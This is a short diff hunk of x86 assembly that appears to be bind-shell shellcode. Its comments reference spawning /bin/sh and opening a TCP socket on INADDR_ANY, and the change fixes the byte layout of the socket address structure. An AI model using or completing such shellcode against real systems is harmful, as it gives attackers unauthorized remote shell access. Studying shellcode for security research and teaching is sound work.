@@ -50,8 +50,8 @@
         ;; execve("/bin/sh", NULL, NULL);
         ;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         xor eax, eax
-        mov [esp + 12], al
-        mov [esp + 13], byte AF_INET
+        mov [esp + 12], byte AF_INET
+        mov [esp + 13], al
         mov [esp + 14], word PORT
         mov [esp + 16], eax         ; INADDR_ANY just happens to be 0x0
         ;; sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
